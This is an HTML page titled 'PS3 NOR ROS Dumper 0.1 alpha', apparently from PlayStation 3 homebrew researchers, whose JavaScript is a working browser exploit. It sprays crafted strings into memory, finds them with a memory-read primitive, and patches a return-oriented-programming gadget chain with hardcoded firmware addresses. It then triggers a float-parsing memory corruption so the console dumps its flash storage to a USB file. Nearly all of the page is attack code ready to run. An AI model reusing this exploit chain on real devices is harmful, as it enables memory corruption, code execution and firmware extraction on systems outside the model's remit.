<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<script>

function findJsVariableOffset(name,exploit_data,search_base,search_size,pattern,len,used_offsets,_log_div) //search_base parameter value paased to this function must be aligned on 0x0 or 0x8 same as string allocation
{
	try
	{
		var dat=readMemory(document.getElementById('exploit'),search_base,search_size).substr(6,search_size);
		
		for (var i=0;i<(search_size*2);i+=0x10)	// loop searching for tag every 8 bytes due to alignment
		{
			if (dat.charCodeAt(i/2)==pattern)
			{
				var match=0;
				for (var k=0;k<(len*2);k+=0x2)	// loop next bytes for comparison
				{
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))	// convert to string for comparison
					{
						break;
					}
					match+=1;	// increment match
				}
				if (match==len)	// we got a complete match
				{
					var exploit_addr=search_base+i+2;	// hold exploit addr
					dbg("Found "+name+" at: 0x"+exploit_addr.toString(16),_log_div);	// display the exploit address
					var cont=0;
					if(used_offsets.length>0)
					{
						for(var idx=0;idx<used_offsets.length;idx++)
						{
							if(used_offsets[idx]==exploit_addr)
							{
								cont=1;
								break;
							}
						}
						if(cont==1)
						{
							dbg("0x"+exploit_addr.toString(16)+" is ignored.", _log_div);
							cont=0;
							continue;
						}
					}
					used_offsets.push(exploit_addr);
					dbg("0x"+exploit_addr.toString(16)+" was added to used_offsets array.", _log_div);
					dat=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		var end_range = search_base+search_size;
		dbg("The string variable named "+name+" could not be located in range 0x"+search_base.toString(16)+" - 0x"+end_range.toString(16), _log_div);
		return 0;
	} 
	catch(e) 
	{
		dbg(e, _log_div);
	}
}
function trigger(exploit_addr)
{
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}
function initROP()
{
	try
	{
		var log_div = logEntry();
		// FIXME the new_line requires a different tag on browser than on python console, a replacement algo needs implemented in dbg function call..
		 //var new_line = "\r\n"; // Python console tag
		var new_line = "<br>"; // browser tag
		
		var used_offsets_arr = [80000000];
		var usb_fp_rosdump,gadgets,jump_2,jump_1;
		var usb_fp_rosdump_addr=0,gadgets_addr=0,jump_2_addr=0,jump_1_addr=0;
		var usb_fp_rosdump_bytecount=0x20*2;
		var gadgets_bytecount=0x320*2;
		var jump_2_bytecount=0x24*2;
		var jump_1_bytecount=0x4*2;
		
		var search_max_threshold = 40*0x100000; //40Mb
		var search_base_offset = 0x80180000;
		var search_range_size = 0xF8000;
		var ph = 0x2A2F;		
		
		dbg("Searching memory range for usb_fp_rosdump string offset....", log_div);
		usb_fp_rosdump=unescape("\u4444\u2F64\u6576\u5F75\u7362\u3030\u302F\u666C\u7368\u2E68\u6578\u0000\u7762\u0000\u0000\u4141");	// 32 bytes
		usb_fp_rosdump+=unescape("\u4141\u4141\u4141\u000D\u9680\u006F\u5520\u0000\uFFFF\uFFFF\u4141\u4141\u4141\u4141\u4141\u2F2A");	// 32 bytes 
		
		do
		{
			if(search_max_threshold<search_range_size){dbg("Restarting POC... Please wait...",log_div);window.location.reload(true);return;}
			search_max_threshold-=search_range_size;
			usb_fp_rosdump=usb_fp_rosdump.replaceAt(0x000/2,hexh2bin(ph));
			usb_fp_rosdump_addr=findJsVariableOffset("usb_fp_rosdump",usb_fp_rosdump,search_base_offset+search_range_size,search_range_size+0x1C000,ph,usb_fp_rosdump_bytecount/2,used_offsets_arr, log_div);
		}while(usb_fp_rosdump_addr==0);
		
		// DEX
		// \u4141 is used for general padding
		// other \u4x4x are used as placeholders for runtime replacement by js replaceAt calls
		// Other values like \u2424\u2424\u2424\u2424 means that this 8 byte value will eventually be loaded into r24 by one of the gadgets
		//var st_addr=usb_fp_rosdump_addr-0x30;
		var readlen_addr=usb_fp_rosdump_addr-0x12;
		var dev_handle_addr=usb_fp_rosdump_addr-0x8;
		var usb_fp_addr=usb_fp_rosdump_addr+0x00;
		var wb_addr=usb_fp_rosdump_addr+0x16;
		var sso_addr=usb_fp_rosdump_addr+0x24;
		//var xx_addr=usb_fp_rosdump_addr+0x28;
		//var fd_addr=usb_fp_rosdump_addr+0x34;
		var rosdump_addr=usb_fp_rosdump_addr+0x3C;
<!-- DEX -->
<!-- 0x0976BC -->
<!-- 0x6161B8 -->
<!-- 0x1A43FC -->
<!-- 0x0DEBD8 -->
<!-- 0x434368 -->
<!-- 0x42B708 -->
<!-- 0x62F814 -->
<!-- CEX -->
<!-- 0x0009739C -->
<!-- 0x0060E59C -->
<!-- 0x0019D3B0 -->
<!-- 0x000D9680 -->
<!-- 0x0042C774 -->
<!-- 0x00423B14 -->
<!-- 0x00627BF8 -->
		dbg("Searching memory range for gadgets string offset....", log_div);
		gadgets= unescape("\u0102\u0009\u7604\uF2F2\uF2F2\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\uF2F2\uF2F2\uF2F2\uF2F2\u5152\u5354\u5556\u5758\u5960\u6162\u6364");	//64 bytes * 23
		gadgets+=unescape("\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728");
		gadgets+=unescape("\u2930\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8A00\u0000\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0000\u0060\uE59C\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192");
		gadgets+=unescape("\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556");
		gadgets+=unescape("\u5758\u5960\u6162\u0000\u0258\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0000\uFF05\uFF05\u0000\u0000\uFF03\uFF03\uFF09\uFF09\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\uFF29\uFF29\uFF29");
		gadgets+=unescape("\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8A00\u0100\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u0000\u0000\u0019\uD3B0\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384");
		gadgets+=unescape("\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u8586\u8788");
//		gadgets+=unescape("\u8990\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u0100\u0000\u0000\u0004\u7576\u7778\u7980\u8182\u0000\u0000\u0060\uE59C\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112"); //NOR
		gadgets+=unescape("\u8990\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u0100\u0000\u0000\u0001\u7576\u7778\u7980\u8182\u0000\u0000\u0060\uE59C\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112"); //NAND
		gadgets+=unescape("\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576");
		gadgets+=unescape("\u7778\u7980\u8182\u0000\u025A\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0001\u0000\u0000\u0000\u0000\uFF03\uFF03\u0000\u0022\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29");
		gadgets+=unescape("\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\uFF31\uFF31\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0042\uC774\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304");
		gadgets+=unescape("\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768");
		gadgets+=unescape("\u6970\u7172\u7374\u7576\u7778\u0000\u0000\u8A00\u0200\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000\u0062\u7BF8\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132");
		gadgets+=unescape("\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596");
		gadgets+=unescape("\u9798\u9900\u0102\u0304\u0506\u0000\u0259\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u0000\u0000\uFF29\uFF29\u4748\u4950\u5152\u5354\u0000\u0000\uFF31");
		gadgets+=unescape("\uFF31\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000\u0042\uC774\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324");
		gadgets+=unescape("\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u0000\u0000\u8A00");
		gadgets+=unescape("\u0300\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0000\u0000\u0060\uE59C\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152");
		gadgets+=unescape("\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\uFF11\uFF11\uFF10\uFF10\uFF08");
		gadgets+=unescape("\uFF08\uFF07\uFF07\uFF06\uFF06\u0000\u0400\uFF04\uFF04\uFF03\uFF03\uFF09\uFF09\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u0000\u0000\u0000\u0400\u0000\u0000\uFF30\uFF30\u0000\u0000\uFF31");
		gadgets+=unescape("\uFF31\u8384\u8586\u8788\u8990\uF10F\u9394\u9596\u9798\u0000\u0000\u0001\u3B74\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344");
		gadgets+=unescape("\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000\uFF31");
		gadgets+=unescape("\uFF31\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u0000\u0000\u0042\u3B14\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970");
		gadgets+=unescape("\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334");
		gadgets+=unescape("\u3536\u3738\u3940\u4142\u4344\u0000\u0000\u8A00\u0400\u0000\u0000\u0042\u3B14\u0000\u0000\u8A00\u0500\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u0000\u0000\u000C\u6730\u9394\u9596\u2A2F");


		
																
		gadgets=gadgets.replaceAt(0x11A/2,hexh2bin(dev_handle_addr>>16)); //sys_storage_open device handle offset
		gadgets=gadgets.replaceAt(0x11C/2,hexh2bin(dev_handle_addr));
		gadgets=gadgets.replaceAt(0x126/2,hexh2bin(sso_addr>>16)); //sys_storage_open for 0x0(r9) offset
		gadgets=gadgets.replaceAt(0x128/2,hexh2bin(sso_addr));
		gadgets=gadgets.replaceAt(0x24E/2,hexh2bin(readlen_addr>>16)); //sys_storage_read readlen offset
		gadgets=gadgets.replaceAt(0x250/2,hexh2bin(readlen_addr));
		gadgets=gadgets.replaceAt(0x252/2,hexh2bin(rosdump_addr>>16)); //sys_storage_read buffer offset
		gadgets=gadgets.replaceAt(0x254/2,hexh2bin(rosdump_addr));		
		gadgets=gadgets.replaceAt(0x28E/2,hexh2bin(dev_handle_addr>>16)); //sys_storage_read device handle offset
		gadgets=gadgets.replaceAt(0x290/2,hexh2bin(dev_handle_addr));
		gadgets=gadgets.replaceAt(0x3BE/2,hexh2bin(dev_handle_addr>>16)); //sys_storage_close device handle offset
		gadgets=gadgets.replaceAt(0x3C0/2,hexh2bin(dev_handle_addr));
		gadgets=gadgets.replaceAt(0x4CE/2,hexh2bin(wb_addr>>16)); //'wb' parameter offset
		gadgets=gadgets.replaceAt(0x4D0/2,hexh2bin(wb_addr));
		gadgets=gadgets.replaceAt(0x4D2/2,hexh2bin(usb_fp_addr>>16)); //filepath parameter offset
		gadgets=gadgets.replaceAt(0x4D4/2,hexh2bin(usb_fp_addr));		
		gadgets=gadgets.replaceAt(0x4F6/2,hexh2bin(rosdump_addr>>16)); //rosdump parameter offset
		gadgets=gadgets.replaceAt(0x4F8/2,hexh2bin(rosdump_addr));
		gadgets=gadgets.replaceAt(0x4FE/2,hexh2bin(usb_fp_addr>>16)); //filepath parameter offset
		gadgets=gadgets.replaceAt(0x500/2,hexh2bin(usb_fp_addr));
		
		//gadgets=gadgets.replaceAt(0x57E/2,hexh2bin(rosdump_addr>>16)); //rosdump buffer offset
		//gadgets=gadgets.replaceAt(0x580/2,hexh2bin(rosdump_addr));		
		//gadgets=gadgets.replaceAt(0x3CA/2,hexh2bin(st_addr>>16)); //st_addr offset
		//gadgets=gadgets.replaceAt(0x3CC/2,hexh2bin(st_addr));
		//gadgets=gadgets.replaceAt(0x368/2,hexh2bin(xx_addr>>16)); //xx_addr for future 32bit value offset
		//gadgets=gadgets.replaceAt(0x36A/2,hexh2bin(xx_addr));		
		//gadgets=gadgets.replaceAt(0x014/2,hexh2bin(fd_addr>>16)); //fd (file descriptor) parameter offset
		//gadgets=gadgets.replaceAt(0x016/2,hexh2bin(fd_addr));
		
		
		ph = 0x2A2F;
		do
		{
			if(search_max_threshold<search_range_size){dbg("Restarting POC... Please wait...",log_div);window.location.reload(true);return;}
			search_max_threshold-=search_range_size;
			gadgets=gadgets.replaceAt(0x000/2,hexh2bin(ph));
			gadgets_addr=findJsVariableOffset("gadgets",gadgets,search_base_offset,search_range_size,ph,gadgets_bytecount/2,used_offsets_arr, log_div);
		}while(gadgets_addr==0);
		
		
		dbg("Searching memory range for jump_2 string offset....", log_div);
		jump_2=unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950"); // 50 bytes
		jump_2+=unescape("\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7EFB"); // 22 bytes
		jump_2=jump_2.replaceAt(0x32/2,hexh2bin(gadgets_addr>>16)); //gadgets offset
		jump_2=jump_2.replaceAt(0x34/2,hexh2bin(gadgets_addr));	
		
		search_range_size = 0x450000;
		ph = 0x7EFB;
		
		do
		{
			if(search_max_threshold<search_range_size){dbg("Restarting POC... Please wait...",log_div);window.location.reload(true);return;}
			search_max_threshold-=search_range_size;
			jump_2=jump_2.replaceAt(0x00/2,hexh2bin(ph));
			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base_offset,search_range_size,ph,jump_2_bytecount/2,used_offsets_arr, log_div);
		}while(jump_2_addr==0);
		
		dbg("Searching memory range for jump_1 string offset....", log_div);
		jump_1=unescape("\u4141\u4141\u4141\u7EFA"); // 8 bytes == 4 bytes + 4 bytes placeholders
		jump_1=jump_1.replaceAt(0x02/2,hexh2bin(jump_2_addr>>16)); //jump_2 offset
		jump_1=jump_1.replaceAt(0x04/2,hexh2bin(jump_2_addr));	
		
		ph = 0x7EFA;
		do
		{
			if(search_max_threshold<search_range_size){dbg("Restarting POC... Please wait...",log_div);window.location.reload(true);return;}
			search_max_threshold-=search_range_size;
			jump_1=jump_1.replaceAt(0x00/2,hexh2bin(ph));
			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base_offset,search_range_size,ph,jump_1_bytecount/2,used_offsets_arr, log_div);
		}while(jump_1_addr==0);
		
		dbg("Summary:");
		dbg("rosdump variable offset: 0x"+usb_fp_rosdump_addr.toString(16), log_div);
		//send_read(readMemory(document.getElementById('exploit'),usb_fp_rosdump_addr-0x2,usb_fp_rosdump_bytecount+0x2).substr(6,usb_fp_rosdump_bytecount), usb_fp_rosdump_addr-0x2, usb_fp_rosdump_bytecount, log_div);
		dbg("gadget: "+bytesToHex(usb_fp_rosdump), log_div);
		dbg("gadgets variable offset: 0x"+gadgets_addr.toString(16), log_div);
		//send_read(readMemory(document.getElementById('exploit'),gadgets_addr-0x2,gadgets_bytecount+0x2 ).substr(6,gadgets_bytecount), gadgets_addr-0x2, gadgets_bytecount, log_div);
		dbg("gadget: "+bytesToHex(gadgets), log_div);
		//send_dump_name(readMemory(document.getElementById('exploit'),gadgets_addr-0x2,gadgets_bytecount+0x2).substr(6,gadgets_bytecount), gadgets_addr-0x2, gadgets_bytecount, new Date().toTimeString()+"_0x"+gadgets_addr.toString(16)+".bin");
		dbg("jump_2 variable offset: 0x"+jump_2_addr.toString(16), log_div);
		//send_read(readMemory(document.getElementById('exploit'),jump_2_addr-0x2,jump_2_bytecount+0x2).substr(6,jump_2_bytecount), jump_2_addr-0x2, jump_2_bytecount, log_div);
		dbg("gadget: "+bytesToHex(jump_2), log_div);
		dbg("jump_1 variable offset: 0x"+jump_1_addr.toString(16), log_div);
		//send_read(readMemory(document.getElementById('exploit'),jump_1_addr-0x2,jump_1_bytecount+0x2).substr(6,jump_1_bytecount), jump_1_addr-0x2, jump_1_bytecount, log_div);
		dbg("gadget: "+bytesToHex(jump_1), log_div);
		dbg("Triggering exploit....", log_div);
		//alert("Ready to trigger!");
		trigger(jump_1_addr);
		
		// To avoid possible garbage collection if local variables are neither in use nor referenced anymore before trigger call...
		// I added the next 4 lines... Any reference to the 4 strings would do though, no need for logAdd in particular...
		console.log(s2hex(usb_fp_rosdump), log_div);
		console.log(s2hex(gadgets), log_div);
		console.log(s2hex(jump_2), log_div);
		console.log(s2hex(jump_1), log_div);
		setTimeout(writeEnvInfo,0,document.getElementById('footer'));
		return;
	} 
	catch(e) 
	{
		dbg(e, log_div);
	}
}
</script>
</head>
	<body id="BodyID" onload="setTimeout(initROP,0);">
		<div id="HeaderID" style="color:#CC2010">
		<h1>PS3 NOR ROS Dumper 0.1 alpha</h1>
		<p>Courtesy of Willerson Stockler (Javascript, Research & Testing), esc0rtd3w (Debugging, Research & Testing) & bguerville (ROP Chaining/Javascript & Debugging)<br/>
		With many thanks to Joonie & zecoxao for their regular advice, friendly support & extra testing...<br>
		More details & news on psx-place.com, source code repository: http://www.github.com/<br>
		Check the exploit log below..<br></p>
		</div>
		<div id="exploit" ></div><br>
		<div id="log"></div><br>
		<div id="trigger"></div><br>
		<div id="footer" style="color:#CC2010"></div><br>
	</body>
</html>
